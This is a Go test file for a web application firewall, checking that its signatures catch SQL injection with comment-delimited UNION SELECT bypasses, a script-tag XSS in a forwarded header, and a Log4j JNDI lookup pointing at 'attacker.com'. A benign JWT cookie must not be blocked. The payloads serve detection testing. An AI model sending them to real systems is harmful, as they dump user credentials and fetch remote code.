package waf

import (
	"testing"
)

// REQ-SVALINN-WAF-SQLICOMMENT-001: SQLI-004 must match comment-delimited tokens and DISTINCT
func TestScan_UnionCommentBypass(t *testing.T) {
	e := newSSRFTestEngine(t)

	cases := []struct {
		name  string
		path  string
		query string
		body  string
	}{
		{
			name:  "plain space union select (baseline)",
			path:  "/search",
			query: "q=1%20UNION%20SELECT%20username,password%20FROM%20users",
		},
		{
			name:  "block comment between union and select",
			path:  "/search",
			query: "q=1%20UNION/**/SELECT%20username,password%20FROM%20users",
		},
		{
			name:  "block comment with distinct",
			path:  "/search",
			query: "q=1%20UNION/**/DISTINCT/**/SELECT%20username,password%20FROM%20users",
		},
		{
			name:  "plain space union distinct select",
			path:  "/search",
			query: "q=1%20UNION%20DISTINCT%20SELECT%20username,password%20FROM%20users",
		},
		{
			name: "json body with union comment select",
			path: "/api/search",
			body: `{"q":"1 UNION/**/SELECT username,password FROM users"}`,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := e.Scan(tc.path, tc.query, tc.body, map[string]string{}, "curl/8.0")
			if !hasSignature(res.Matches, "SQLI-004") {
				t.Fatalf("Scan: expected SQLI-004 match for %s, got matches: %+v", tc.name, res.Matches)
			}
			if !res.Blocked {
				t.Fatalf("Scan: expected request to be blocked (score >= 0.8), got score=%.2f", res.Score)
			}
		})
	}
}

// REQ-SVALINN-WAF-HEADERTARGET-001: Payloads in headers (Cookie, Referer, X-Forwarded-*) must be scanned
func TestScan_HeaderTargetBypass(t *testing.T) {
	e := newSSRFTestEngine(t)

	cases := []struct {
		name    string
		headers map[string]string
		wantSig string
	}{
		{
			name: "cookie sql injection",
			headers: map[string]string{
				"Cookie": "sid=1' UNION SELECT username,password FROM users--",
			},
			wantSig: "SQLI-004",
		},
		{
			name: "x-forwarded-host xss injection",
			headers: map[string]string{
				"X-Forwarded-Host": "<script>alert(1)</script>",
			},
			wantSig: "XSS-001",
		},
		{
			name: "referer sql injection",
			headers: map[string]string{
				"Referer": "https://example.com/item?id=1' UNION SELECT 1,2--",
			},
			wantSig: "SQLI-004",
		},
		{
			name: "x-forwarded-for log4j injection",
			headers: map[string]string{
				"X-Forwarded-For": "${jndi:ldap://attacker.com/a}",
			},
			wantSig: "LOG-001",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := e.Scan("/account", "", "", tc.headers, "curl/8.0")
			if !hasSignature(res.Matches, tc.wantSig) {
				t.Fatalf("Scan: expected signature %s for %s, got matches: %+v", tc.wantSig, tc.name, res.Matches)
			}
			if !res.Blocked {
				t.Fatalf("Scan: expected header injection to be blocked, got score=%.2f", res.Score)
			}
		})
	}
}

// REQ-SVALINN-WAF-HEADERTARGET-001: Verify benign cookies (like JWT) do not trigger false positive blocks
func TestScan_HeaderBenignCookieNotBlocked(t *testing.T) {
	e := newSSRFTestEngine(t)

	headers := map[string]string{
		"Cookie": "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
	}

	res := e.Scan("/dashboard", "", "", headers, "Mozilla/5.0")
	if res.Blocked {
		t.Fatalf("Scan: benign JWT cookie was falsely blocked! score=%.2f, matches: %+v", res.Score, res.Matches)
	}
}
